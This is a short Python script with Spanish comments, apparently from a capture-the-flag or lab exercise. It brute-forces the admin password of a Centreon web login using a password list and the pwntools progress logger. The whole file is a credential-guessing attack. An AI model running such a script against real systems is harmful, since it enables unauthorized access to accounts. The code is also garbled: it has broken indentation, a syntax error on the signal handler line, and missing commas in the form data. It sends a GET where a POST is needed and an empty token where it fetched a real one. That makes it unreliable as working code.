````python
#!/usr/bin/python3

from pwn import *
import requests, re, signal, pdb, time, sys

     def def_handler(sig, frame):
          print("\n\n[!] saliendo...\n")
          sys.exit(1)

# Ctrl+C
signal.signal.(signal.SIGINT, def_handler

# variables globales
login_url = "http://10.10.xx.xx/centreon/index.php"

     def makeRequest():

        f = open("passwords.txt", "r")

        s = requests.session()

        p1 = log.progress("fuerza bruta")
        p1.status("iniciando ataque de fuerza bruta")

        time.sleep(2)

        counter = 0

        for password in f.readlines():

            password = password.strip()

            p1.status("probando con la password [%d/10000]: %s" % (counter, password))

            r = s.get(login_url)

            centreonToken = re.findall(r'centreon_token" type="hidden" value="(.*?)"', r.text)[0]

            post_data = {
                 'useralias': 'admin'
                 'password': '%s' % password,
                 'submitLogin': 'Connect'
                 'centreon_token': ''

            }

            r = s.get(login_url, data=post_data)

            if "your credentials are incorrect." not in r.text:
                p1.success("la password es %s" % password)
                sys.exit(0)

            counter += 1

if __name__ == '__main__':

    makeRequest()
    ````
    